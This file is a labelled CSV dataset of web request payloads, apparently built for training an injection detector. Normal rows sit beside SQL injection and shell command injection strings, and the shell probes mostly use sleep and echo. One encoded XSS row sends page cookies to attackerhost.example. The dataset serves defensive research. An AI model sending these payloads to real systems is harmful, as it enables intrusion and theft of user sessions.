payload,label,source
288A12D171DF210703E3DCC9708942A5,Normal,csic_gsi:cisc_normalTraffic_train.txt
modo=entrar&login=gougeon&pwd=abaleadOR&remember=on&B1=Entrar,Normal,csic_gsi:cisc_normalTraffic_test.txt
Muskiz,Normal,csic_gsi:cisc_normalTraffic_train.txt
%3B%20str%3D%24%28echo%20JBUKTB%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%205%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%22,CMD,seclists_cmd
988E8BEF803E8EE087AE147F52A0750A,Normal,csic_gsi:cisc_normalTraffic_test.txt
aprisCar,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
%7Cecho%20PVDDDJ$((29%2B98))$(echo%20PVDDDJ)PVDDDJ&,CMD,seclists_cmd
AB45557FC8C0F355464AB60032705BC4,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
19A1C9437F48D61A55CE9F3A58018233,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
"Calle+Dona+Urraca+0,+",SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
124603B14DA192F364E6E978C3E6BE38,Normal,csic_gsi:cisc_normalTraffic_test.txt
ADBBE0D44C55DC9706B0A2E44865B75C,Normal,csic_gsi:cisc_normalTraffic_train.txt
%2527%7C%20%5B%206%20-ne%20%24%28echo%20NWPDIX%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%23,CMD,seclists_cmd
D0676DFCE57E231E44D9E1F6CDCCCD00,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
B5910F42675A40BD420F78F61046916D,Normal,csic_gsi:cisc_normalTraffic_train.txt
8180,Normal,csic_gsi:cisc_normalTraffic_train.txt
5176682769033876,Normal,csic_gsi:cisc_normalTraffic_train.txt
%0A%20str%3D%24%28echo%20OSXAMI%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%204%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%255C%255C,CMD,seclists_cmd
%22%26%20sleep%200%20%26%26%20str%3D%24%28echo%20FRMTBN%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%207%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20%2527,CMD,seclists_cmd
D4E126814EEB254946A54504ADDE818C,Normal,csic_gsi:cisc_normalTraffic_train.txt
23,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
modo=insertar&precio=5251&B1=Confirmar,Normal,csic_gsi:cisc_normalTraffic_train.txt
malcolm_motaung@enlanzarote.com.yu,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
6FC987571EFE77529F7156F0D83C59D6,Normal,csic_gsi:cisc_normalTraffic_train.txt
%3B%20str%3D%24%28echo%20VHBJGH%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%201%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%255C%255C,CMD,seclists_cmd
%7C%7Cecho$IFSKGBLOE$((27%2B72))$(echo$IFSKGBLOE)KGBLOE%26,CMD,seclists_cmd
43400,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
modo=registro&login=alwyn&password=lumbral&nombre=Farcilaso&apellidos=Indaburu+Mosquera&email=gribbon@engibraltar.to&dni=38989049R&direccion=Plza.+De+Las+Candelas+15+&ciudad=Ti�osillos&cp=46470&provincia=Guip�zcoa&ntc=3094599355025527&B1=Registrar,Normal,csic_gsi:cisc_normalTraffic_test.txt
%22%7C%20%5B%203%20-ne%20%24%28echo%20XWWMIW%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%23,CMD,seclists_cmd
68A491B0C0F439F74B46B5CE9FA37E64,Normal,csic_gsi:cisc_normalTraffic_test.txt
modo=entrar&login=carmelo&pwd=CIcEroNe&rememberA=off&B1=Entrar,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
Banast�s,Normal,csic_gsi:cisc_normalTraffic_train.txt
CBB40FC6F8D58BED1961C167D720BC82,Normal,csic_gsi:cisc_normalTraffic_train.txt
%3B%20str%3D%24%28echo%20KKIQNH%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%206%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%27,CMD,seclists_cmd
DE6BBC5E6006CC551D4EC2DD619656FF,Normal,csic_gsi:cisc_normalTraffic_test.txt
371952B6CF3DAD79CB8CE6584F253994,Normal,csic_gsi:cisc_normalTraffic_train.txt
00505336A,Normal,csic_gsi:cisc_normalTraffic_train.txt
sikes-jeans@923.mv,Normal,csic_gsi:cisc_normalTraffic_train.txt
0131C71C5E0ED445D48065B0A17EBD54,Normal,csic_gsi:cisc_normalTraffic_train.txt
ADC523CE171AECFE14E040821972E7E2,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
6641014815632428,Normal,csic_gsi:cisc_normalTraffic_test.txt
924482A36B08CE66C097004FCFFD3F0B,Normal,csic_gsi:cisc_normalTraffic_train.txt
malcolm,Normal,csic_gsi:cisc_normalTraffic_train.txt
Sant+Llu�s,Normal,csic_gsi:cisc_normalTraffic_train.txt
5275682756103294,Normal,csic_gsi:cisc_normalTraffic_train.txt
8781236153256548,Normal,csic_gsi:cisc_normalTraffic_train.txt
'|echo$IFSNAFNWQ$((47%2B44))$(echo$IFSNAFNWQ)NAFNWQ%7C,CMD,seclists_cmd
||echo$IFSIWAFLA$((17%2B83))$(echo$IFSIWAFLA)IWAFLA//,CMD,seclists_cmd
"C/+Estornino+S/N,+9F",Normal,csic_gsi:cisc_normalTraffic_train.txt
27243677Q,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
CD5ADA515525417C98EF878A6FBC3BA1,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
59CFEFA1A0D61EEE05477951B8B5C4BC,Normal,csic_gsi:cisc_normalTraffic_test.txt
F319F8F2CA619DA54989C29027C7E6B3,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
sotalugo,Normal,csic_gsi:cisc_normalTraffic_train.txt
braganza1,Normal,csic_gsi:cisc_normalTraffic_test.txt
%2522%26%20sleep%200%20%26%26%20str%3D%24%28echo%20VAVICY%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%201%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20%257C,CMD,seclists_cmd
63D51722159FDEAD844D8CB4F537741F,Normal,csic_gsi:cisc_normalTraffic_train.txt
%0aecho$IFSLRBMQR$((4%2B80))$(echo$IFSLRBMQR)LRBMQR%27,CMD,seclists_cmd
695825D91ECE2ADD54325F23BDBBD332,Normal,csic_gsi:cisc_normalTraffic_test.txt
7D436916196F1A988AB3CB80D98A494C,Normal,csic_gsi:cisc_normalTraffic_train.txt
33D88DF5D1E52A9E24053407CC678D4A,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
1E0FC5B6D34EF4B35EEBF6E87CFDB2ED,Normal,csic_gsi:cisc_normalTraffic_test.txt
%22%26%20sleep%200%20%26%26%20str%3D%24%28echo%20ATDESO%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%201%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20,CMD,seclists_cmd
E38191D7E29711C649D7492CEA172DA9,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
016ABA0898427FE31556FB8A961A3302,Normal,csic_gsi:cisc_normalTraffic_train.txt
tolkin@elcarritodelacompra.ec,Normal,csic_gsi:cisc_normalTraffic_test.txt
%7C%20%5B%205%20-ne%20%24%28echo%20MRDZPJ%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%22,CMD,seclists_cmd
D30638DAED006F44CCC45027B4378FAF,Normal,csic_gsi:cisc_normalTraffic_test.txt
%2522%0A%20str%3D%24%28echo%20OUJVKX%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%202%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%7C,CMD,seclists_cmd
37391140CD21252BBE8126CEB482B9F7,Normal,csic_gsi:cisc_normalTraffic_test.txt
E916C056D0A2F89232A581D474713F20,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
501580B889579A9ACE3F83BE4312792D,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
CB0F8028E45B8D1EF92C6C330E1FB93A,Normal,csic_gsi:cisc_normalTraffic_test.txt
7629740795276147,Normal,csic_gsi:cisc_normalTraffic_test.txt
306CC25412D041A0274DFA197DDE556F,Normal,csic_gsi:cisc_normalTraffic_test.txt
modo=entrar&login=harald&pwd=hemorroida&remember=off&B1=Entrar,Normal,csic_gsi:cisc_normalTraffic_test.txt
D3D94323A630F333D45D16DB8F595BC0,Normal,csic_gsi:cisc_normalTraffic_train.txt
EC1BD0D01F32E426E11CC7AEC90C596A,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
Breceda+Perdig�,Normal,csic_gsi:cisc_normalTraffic_train.txt
"Sayago,+156,+",Normal,csic_gsi:cisc_normalTraffic_train.txt
ma*guillo,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
"modo=registro&login=bernarr&password=6in99er9&nombre=Adona�&apellidos=Per�&email=piat.kidman@locuraporno.do&dni=46290400W&direccion=C/+Germana+De+Foix,+46+&ciudad=Pobo,+El&cp=44710&provincia=Salamanca&ntc=9142922555236896&B1=Registrar",Normal,csic_gsi:cisc_normalTraffic_test.txt
modo=entrar&login=heinonen&pwd=S+Oso&remember=on&B1=Entrarany%0ASet-cookie%3A+Tamper%3D1041264011025374727,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
96676664M,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
0974C4F338F2AA73539F47C929B96533,Normal,csic_gsi:cisc_normalTraffic_train.txt
12CDCC414422C2D3A8D30987FEEB1F47,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
%0A%20str%3D%24%28echo%20NFRBHV%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%208%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%27,CMD,seclists_cmd
"Plza.+Alemania,+134,+12?F",Normal,csic_gsi:cisc_normalTraffic_train.txt
E907A8974205BEF4156F85AB005D5E45,Normal,csic_gsi:cisc_normalTraffic_train.txt
211E755F329B4A37CDE677FDF0E0270A,Normal,csic_gsi:cisc_normalTraffic_train.txt
"modo=registro&login=hube&password=51fo53a83&nombre=Joselina&apellidos=G�llego+Hoste&email=swain@waterflyesp.th&dni=90609332G&direccion=Porta+Diego+De+Siloe,+121+11?A&ciudad=Sobrescobio&cp=01420&provincia=Toledo&ntc=6574384578961467&B1=Registrar",Normal,csic_gsi:cisc_normalTraffic_test.txt
B2=Vaciar+carritosessionid=12312312&+username=%3C%73%63%72%69%70%74%3E%64%6F%63%75%6D%65%6E%74%2E%6C%6F%63%61%74%69%6F%6E%3D%27%68%74%74%70%3A%2F%2F%61%74%74%61%63%6B%65%72%68%6F%73%74%2E%65%78%61%6D%70%6C%65%2F%63%67%69%2D%62%69%6E%2F%63%6F%6F%6B%69%65%73%74%65%61%6C%2E%63%67%69%3F%27%2B%64%6F%63%75%6D%65%6E%74%2E%63%6F%6F%6B%69%65%3C%2F%73+%63%72%69%70%74%3E?,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
3D79A05667578BC337511D983986EEA5,Normal,csic_gsi:cisc_normalTraffic_test.txt
430E090978960ED8A1585C33361440F4,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
%26%20sleep%200%20%26%26%20str%3D%24%28echo%20BFQFHB%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%204%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20%23,CMD,seclists_cmd
%26%20sleep%200%20%26%26%20str%3D%24%28echo%20OGQLYS%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%204%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20%22,CMD,seclists_cmd
7696BF0E45AD227515FB5F0261EAC651,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
%7C%7Cecho$IFSBVFYIU$((58%2B91))$(echo$IFSBVFYIU)BVFYIU%7C,CMD,seclists_cmd
modo=entrar&login=lamarre&pwd=d4scubridora&remember=on&B1=Entrar,Normal,csic_gsi:cisc_normalTraffic_train.txt
692462E748F384EDC28674DE94662C8F,Normal,csic_gsi:cisc_normalTraffic_train.txt
0s2933+7e2A,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
177278998AD415F61DA9DE43E748A8E4,Normal,csic_gsi:cisc_normalTraffic_train.txt
08CEBCC3B3360D76CE75D0A6E7CD8935,Normal,csic_gsi:cisc_normalTraffic_test.txt
Treserra+Nu�ez,Normal,csic_gsi:cisc_normalTraffic_test.txt
DF6A2085D05C40AF94ABD5F674B325F9,Normal,csic_gsi:cisc_normalTraffic_test.txt
6838,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
%26%20sleep%200%20%26%26%20str%3D%24%28echo%20JSQHHO%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%202%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20%7C,CMD,seclists_cmd
D86260577E91D5FF18F8886CEA75126D,Normal,csic_gsi:cisc_normalTraffic_test.txt
"Carretera+a+La+Albericia+y+Monte+42,+",Normal,csic_gsi:cisc_normalTraffic_test.txt
90A14E99E2484771B5703B59ECD52D72,Normal,csic_gsi:cisc_normalTraffic_test.txt
26F4174BF37CAD6AF6328390F1251B92,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
44482694G,Normal,csic_gsi:cisc_normalTraffic_test.txt
%7Cecho$IFSVVVVVP$((21%2B21))$(echo$IFSVVVVVP)VVVVVP//,CMD,seclists_cmd
89F022A7D48474CC34D0D1B405021001,Normal,csic_gsi:cisc_normalTraffic_train.txt
"modo=registro&login=bulanda&password=co3trI�ir&nombre=Beatriz&apellidos=Calvet+Ibars&email=binney8@telogis.lb&dniA=39498492V&direccion=Calle+Atico+Noguerol+192,+7E&ciudad=Elduain&cp=22190&provincia=Toledo&ntc=1924133576102581&B1=Registrar",SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
Pica�ol+Pedreira,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
C75987B07FEF934E3D3D548849C56BD5,Normal,csic_gsi:cisc_normalTraffic_train.txt
modo=insertar&precio=4708&B1=Pasar+por+caja/,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
5517817900139289,Normal,csic_gsi:cisc_normalTraffic_test.txt
3BF66EF810A7F0E7DD9EF2B6A991BB41,Normal,csic_gsi:cisc_normalTraffic_test.txt
10nfig318c559,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
annette,Normal,csic_gsi:cisc_normalTraffic_train.txt
%22%0A%20str%3D%24%28echo%20VDEVWJ%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%201%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%252F%252F,CMD,seclists_cmd
Amaru,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
%7C%7Cecho$IFSVNAEYF$((4%2B92))$(echo$IFSVNAEYF)VNAEYF%22,CMD,seclists_cmd
Bakaiku,Normal,csic_gsi:cisc_normalTraffic_test.txt
54BF51D9FD96A9ECFF5A4D09C34CFCA0,Normal,csic_gsi:cisc_normalTraffic_test.txt
010B2922E0812A55ACB9CDCDA3E56555,Normal,csic_gsi:cisc_normalTraffic_train.txt
32566111C,Normal,csic_gsi:cisc_normalTraffic_train.txt
ED8EBAFA2B9D6D1B08E2655D966D0F8B,Normal,csic_gsi:cisc_normalTraffic_test.txt
72622617W,Normal,csic_gsi:cisc_normalTraffic_test.txt
304295196082B402D5AAA59C807D9B85,Normal,csic_gsi:cisc_normalTraffic_test.txt
7312619550E7EB8D6B16848E51B98C7F,Normal,csic_gsi:cisc_normalTraffic_train.txt
35CE2DFE892D74F9D16C21AA19BD238C,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
No�,Normal,csic_gsi:cisc_normalTraffic_train.txt
14253157B,Normal,csic_gsi:cisc_normalTraffic_train.txt
'%20echo%20HYHGIN$((59%2B21))$(echo%20HYHGIN)HYHGIN|,CMD,seclists_cmd
%26%20sleep%200%20%26%26%20str%3D%24%28echo%20ZYXRFF%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%205%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20%26,CMD,seclists_cmd
koralle,Normal,csic_gsi:cisc_normalTraffic_test.txt
F3AB5532F5F3FE2F38A84548251627A2,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
6535683969714030,Normal,csic_gsi:cisc_normalTraffic_train.txt
"modo=registro&login=koprulu&password=8e6a74aer&nombre=Lihu�l&apellidos=Canal+Dolcet&email=samuel.felden@multaspendientes.yu&dni=53666035C&direccion=Pasaje+Trigueros,+170,+&ciudad=Bufali&cp=45182&provincia=C�ceres&ntc=5730165780562734&B1=Registrar",Normal,csic_gsi:cisc_normalTraffic_train.txt
10880,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
'%26echo%20PXNVTZ$((92%2B1))$(echo%20PXNVTZ)PXNVTZ%22,CMD,seclists_cmd
"modo=registro&login=lavena&password=c3n9637z6ent9&nombre=Navidad&apellidos=Chiappe+Valentini&email=milijan.espino@farma-job.museum&dni=76456024E&direccion=Cristobal+Colon+65,+&ciudad=Villanueva+de+San+Juan&cp=16909&provincia=Le�n&ntc=9615181904532386&B1=Registrar",Normal,csic_gsi:cisc_normalTraffic_test.txt
274042DCE547D33D7338459AB808CB6A,Normal,csic_gsi:cisc_normalTraffic_test.txt
%2527%26%20sleep%200%20%26%26%20str%3D%24%28echo%20KMQXRC%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%205%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20%2527,CMD,seclists_cmd
3866167824231022,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
7E9F7E56B4EB9B62F65FE86BEF955100,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
id=1&nombre=Queso+Manchego&precio=39&cantidad=30&B1=AND+1=1,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
""")print(`echo%20PPZHBZ%0aecho%20$((86%2B40))%0aecho%20PPZHBZ%0aecho%20PPZHBZ`)%3BPPZHBZ",CMD,seclists_cmd
35726129E,Normal,csic_gsi:cisc_normalTraffic_test.txt
"Isla+De+Salvora,+65+1?C",SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
%22%7C%20%5B%204%20-ne%20%24%28echo%20EUILIT%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%27,CMD,seclists_cmd
841EEBD70DBB894B2D0D3CEA666958DD,Normal,csic_gsi:cisc_normalTraffic_train.txt
7379824468809426,Normal,csic_gsi:cisc_normalTraffic_train.txt
%2527%0A%20str%3D%24%28echo%20BNZVGD%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%206%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20,CMD,seclists_cmd
8430846550683709,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
%2522%7C%20%5B%201%20-ne%20%24%28echo%20JYVQFK%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%2527,CMD,seclists_cmd
39890773X,Normal,csic_gsi:cisc_normalTraffic_test.txt
modo=registro&login=balutis&password=antiseps$ia&nombre=Ethan&apellidos=Rodrigo+Velazquez&email=tennant.depusse@dissident.ie&dni=19552581M&direccion=C/+Marquesa+De+Vilallonga+53+5F&ciudad=Sobradillo&cp=48650&provincia=Valladolid&ntc=1523492896649032&B1=Registrar,Normal,csic_gsi:cisc_normalTraffic_train.txt
46267,Normal,csic_gsi:cisc_normalTraffic_test.txt
"Escalinata+De+La+Vega,+29+2?G",Normal,csic_gsi:cisc_normalTraffic_test.txt
muir-vasilescu5@lodgeinmadrid.ir,Normal,csic_gsi:cisc_normalTraffic_train.txt
7C92EDD8208440254B000419C277C596,Normal,csic_gsi:cisc_normalTraffic_train.txt
B5B5FF86962B15FE55C940437E3B7CF4,Normal,csic_gsi:cisc_normalTraffic_test.txt
5B3DA0EEFF2C697A26CD2D1C0504161C,Normal,csic_gsi:cisc_normalTraffic_train.txt
;echo$IFSXRJTLU$((75%2B30))$(echo$IFSXRJTLU)XRJTLU%27,CMD,seclists_cmd
52EFBAA3D2E020BEFC91578FBA40DAF9,Normal,csic_gsi:cisc_normalTraffic_train.txt
%2522%26%20sleep%200%20%26%26%20str%3D%24%28echo%20RYBKIP%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%202%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20%252F%252F,CMD,seclists_cmd
Viviana,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
EC786661FE7931A6F9684A43164067AF,Normal,csic_gsi:cisc_normalTraffic_train.txt
%7C%20%5B%204%20-ne%20%24%28echo%20FTWOKG%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%257C,CMD,seclists_cmd
Plata+Compieque,Normal,csic_gsi:cisc_normalTraffic_train.txt
E8639719C1F54D2E339CACEC10896EBF,Normal,csic_gsi:cisc_normalTraffic_test.txt
51858384P,Normal,csic_gsi:cisc_normalTraffic_train.txt
es*tafilococo,Normal,csic_gsi:cisc_normalTraffic_test.txt
CE646E99D259A2B432330F604918D2FC,Normal,csic_gsi:cisc_normalTraffic_test.txt
9050101948590095,Normal,csic_gsi:cisc_normalTraffic_test.txt
96B14E7916B9BB4C72DF164CA947D5FD,Normal,csic_gsi:cisc_normalTraffic_train.txt
Ademuz,Normal,csic_gsi:cisc_normalTraffic_train.txt
7839,Normal,csic_gsi:cisc_normalTraffic_train.txt
0515AD353640B3DB8BA4AD4253662B51,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
%27%3Becho$IFSCFBNIF$((41%2B28))$(echo$IFSCFBNIF)CFBNIF//,CMD,seclists_cmd
%3Becho%20SKJOIJ$((68%2B83))$(echo%20SKJOIJ)SKJOIJ,CMD,seclists_cmd
7CF24BAB986C0D06D772E804B39CF8C1,Normal,csic_gsi:cisc_normalTraffic_train.txt
%27%0A%20str%3D%24%28echo%20ZSGSGJ%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%209%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20//,CMD,seclists_cmd
04E387D310C527285394B8BE2B263ABF,Normal,csic_gsi:cisc_normalTraffic_test.txt
ABE8EE96CDAB34D53A59F0A1D2F6CC1A,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
id=1&nombre=Vino+Rioja&precio=100&cantidad=36&B1=A�adir+al+carrito,Normal,csic_gsi:cisc_normalTraffic_train.txt
%27%26echo$IFSNWJCNK$((78%2B98))$(echo$IFSNWJCNK)NWJCNK%26,CMD,seclists_cmd
mccauley,Normal,csic_gsi:cisc_normalTraffic_test.txt
45173047D5224A07091980C51B7628DD,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
kosarski,Normal,csic_gsi:cisc_normalTraffic_test.txt
'%0aecho%20MAOXEM$((48%2B53))$(echo%20MAOXEM)MAOXEM|,CMD,seclists_cmd
%2522%7C%20%5B%205%20-ne%20%24%28echo%20BILMTI%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%252F%252F,CMD,seclists_cmd
-fortificaci�n,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
"errorMsg=Credenciales+incorrectas','0','0','0','0');waitfor+delay+'0:0:15';--",SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
FD50FFB3DC97D845C969FAB0F5F66403,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
%7C%20%5B%202%20-ne%20%24%28echo%20FYXPMZ%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%2527,CMD,seclists_cmd
anstice30,Normal,csic_gsi:cisc_normalTraffic_test.txt
47DBB7DA07156D8B3B20677A98446376,Normal,csic_gsi:cisc_normalTraffic_test.txt
%2527%0A%20str%3D%24%28echo%20GGPYAR%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%204%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%2522,CMD,seclists_cmd
4D77D53D1253F0D3072479B0635A48EF,Normal,csic_gsi:cisc_normalTraffic_test.txt
1058A9DD9CB93C77E79480509A6DB4C2,Normal,csic_gsi:cisc_normalTraffic_test.txt
errorMsg=Credenciales+incorrectas%2B,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
8549A974FC8B999CF7AC4D8B6C175A5B,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
25211,Normal,csic_gsi:cisc_normalTraffic_test.txt
modo=entrar&login=derrick&pwd=MaNUmitI6&remember=on&B1=Entrar,Normal,csic_gsi:cisc_normalTraffic_train.txt
273075DE04D2D6D91D2F90271DBA822D,Normal,csic_gsi:cisc_normalTraffic_train.txt
7107EE4936DE8A1F027B3465C943CA7A,Normal,csic_gsi:cisc_normalTraffic_test.txt
%26%20sleep%200%20%26%26%20str%3D%24%28echo%20LOGUJR%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%203%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20%252F%252F,CMD,seclists_cmd
qinghui,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
Aceituna,Normal,csic_gsi:cisc_normalTraffic_train.txt
B8B39A1558217D3BEB4A9CE83801DAEC,Normal,csic_gsi:cisc_normalTraffic_train.txt
198807DB457A516E4E7A2F1233609A21,Normal,csic_gsi:cisc_normalTraffic_train.txt
"Santa+Maria+39,+",Normal,csic_gsi:cisc_normalTraffic_test.txt
4073783110590723,Normal,csic_gsi:cisc_normalTraffic_train.txt
70490166EE9CDB183DC2502BBEF15DED,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
70ABA5A497BFDA43E279DBE9D6056B29,Normal,csic_gsi:cisc_normalTraffic_train.txt
"modo=registro&login=houdini&password=ti7a66aguer7&nombre=Azrael&apellidos=G�mez+Granados&email=bruck7@introito.cg&dni=13111107A&direccion=La+Tragedia,+15,+8-H&ciudad=Nava+del+Barco&cp=04811&provincia=Alicante&ntc=3959831613042356&B1=Registrar",Normal,csic_gsi:cisc_normalTraffic_test.txt
F48C1C512BCE27F513663D50FFB75E9C,Normal,csic_gsi:cisc_normalTraffic_test.txt
Romeu+Herrero,Normal,csic_gsi:cisc_normalTraffic_train.txt
Arteaga+Manzanares,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
D750BF4FABA8BDA53F1CC5A6218E2835,Normal,csic_gsi:cisc_normalTraffic_test.txt
